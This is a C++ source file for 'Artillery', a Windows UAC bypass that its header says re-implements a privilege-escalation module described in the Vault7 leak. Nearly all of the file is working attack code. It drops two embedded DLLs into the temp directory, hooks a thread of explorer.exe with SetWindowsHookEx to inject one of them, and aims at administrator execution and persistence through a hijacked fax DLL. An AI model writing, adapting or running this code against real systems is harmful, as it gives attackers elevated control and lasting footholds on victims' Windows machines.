/*
 * Filename: Artillery.cpp
 *
 * Classification:
 * Classified By:
 *
 * Tool Name: Artillery
 * Requirement #:2022-1337
 *
 * Author: Hacker Fantastic
 * Date Created:        12/30/2023
 * Version 1.0:12/30/2023 (00:00)
 *
 * The Vault7 wiki contains references to privilate escalation modules
 * used by the AED. This is an implementation of "Artillery - UAC Bypass"
 * which is one of several UAC bypasses described in the leak. 
 * 
 * Artillery Utilizes elevated COM object to write to System32 and an 
 * auto-elevated process to execute as administrator. According to the
 * wiki this is used for persistence through injection of a FAX DLL to
 * explorer.exe. This UAC bypass (and the persitence) has been tested
 * on Windows 7. 
 * 
 */
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>
#include "resource.h"

#pragma comment(lib,"User32.lib")

// Function to extract a resource to a file
bool ExtractResource(const HINSTANCE hInstance, WORD resourceID, LPCTSTR szFilename)
{
    bool bSuccess = false;
    try
    {
        HRSRC hResource = FindResource(hInstance, MAKEINTRESOURCE(resourceID), L"BINARY");
        if (hResource)
        {
            HGLOBAL hFileResource = LoadResource(hInstance, hResource);
            if (hFileResource)
            {
                void* lpFile = LockResource(hFileResource);
                DWORD dwSize = SizeofResource(hInstance, hResource);

                HANDLE hFile = CreateFile(szFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE)
                {
                    DWORD dwByteWritten;
                    bSuccess = WriteFile(hFile, lpFile, dwSize, &dwByteWritten, NULL);
                    CloseHandle(hFile);
                }
                else
                {
                    std::cerr << "Failed to create file: " << GetLastError() << std::endl;
                }
                FreeResource(hFileResource);
            }
            else
            {
                std::cerr << "Failed to load resource: " << GetLastError() << std::endl;
            }
        }
        else
        {
            std::cerr << "Failed to find resource: " << GetLastError() << std::endl;
        }
    }
    catch (...)
    {
        std::cerr << "Exception occurred while extracting resource" << std::endl;
        bSuccess = false;
    }
    return bSuccess;
}

typedef LRESULT(CALLBACK* HOOKPROC)(int code, WPARAM wParam, LPARAM lParam);

DWORD GetExplorerThreadId(DWORD pid)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(snapshot, &threadEntry))
    {
        do
        {
            if (threadEntry.th32OwnerProcessID == pid)
            {
                CloseHandle(snapshot);
                return threadEntry.th32ThreadID;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    CloseHandle(snapshot);
    return 0;
}


int main()
{
    // Get the %TEMP% directory
    TCHAR szTempDir[MAX_PATH];
    GetTempPath(MAX_PATH, szTempDir);
    printf("Temp directory: %s\n", szTempDir);
    // Build the full paths for the DLLs
    TCHAR szElevatorDllPath[MAX_PATH];
    TCHAR szFxsstDllPath[MAX_PATH];
    _stprintf_s(szElevatorDllPath, _T("%s\\Elevator.dll"), szTempDir);
    _stprintf_s(szFxsstDllPath, _T("%s\\fxsst.dll"), szTempDir);
    printf("Elevator DLL path: %s\n", szElevatorDllPath);
    printf("Fxsst DLL path: %s\n", szFxsstDllPath);
    // Extract the DLLs to the %TEMP% directory
    if (!ExtractResource(GetModuleHandle(NULL), IDR_ELEVATOR_DLL, szElevatorDllPath))
    {
        std::cerr << "Failed to extract Elevator.dll" << std::endl;
        return 1;
    }
    if (!ExtractResource(GetModuleHandle(NULL), IDR_FXSST_DLL, szFxsstDllPath))
    {
        std::cerr << "Failed to extract fxsst.dll" << std::endl;
        return 1;
    }
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &processEntry))
    {
        do
        {
            if (_wcsicmp(processEntry.szExeFile, L"explorer.exe") == 0)
            {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    if (pid == 0)
    {
        std::cerr << "Failed to find explorer.exe\n";
        return 1;
    }
    DWORD tid = GetExplorerThreadId(pid);
    if (tid == 0)
    {
        std::cerr << "Failed to find a thread of explorer.exe\n";
        return 1;
    }
    HMODULE hDll = LoadLibraryEx(szElevatorDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hDll)
    {
        std::cerr << "Failed to load Elevator.dll: " << GetLastError() << std::endl;
        return 1;
    }
    printf("Loaded Elevator.dll\n");
#ifdef _WIN64
    // x64
    HOOKPROC hookProcAddr = (HOOKPROC)GetProcAddress(hDll, "CBTProc");
#elif _WIN32
    // x86
    HOOKPROC hookProcAddr = (HOOKPROC)GetProcAddress(hDll, "_CBTProc@12");
#endif
    if (!hookProcAddr)
    {
        std::cerr << "Failed to get _CBTProc address: " << GetLastError() << std::endl;
        return 1;
    }
    printf("Got _CBTProc address\n");
    HHOOK hHook = SetWindowsHookEx(WH_GETMESSAGE, hookProcAddr, hDll, tid);
    if (!hHook)
    {
        std::cerr << "Failed to set hook: " << GetLastError() << std::endl;
        return 1;
    }
    printf("Hook set\n");
    // Send a WM_RBUTTONDOWN message to the thread to trigger the hook
    if (!PostThreadMessage(tid, WM_RBUTTONDOWN, (WPARAM)0, (LPARAM)0))
    {
        std::cerr << "Failed to post thread message: " << GetLastError() << std::endl;
        return 1;
    }
    printf("WM_RBUTTONDOWN message posted\n");
    // Sleep for 1 second
    Sleep(1000);
    // Unhook and unload the DLL
    UnhookWindowsHookEx(hHook);
    FreeLibrary(hDll);
    printf("Unhooked and unloaded DLL\n");
    return 0;
}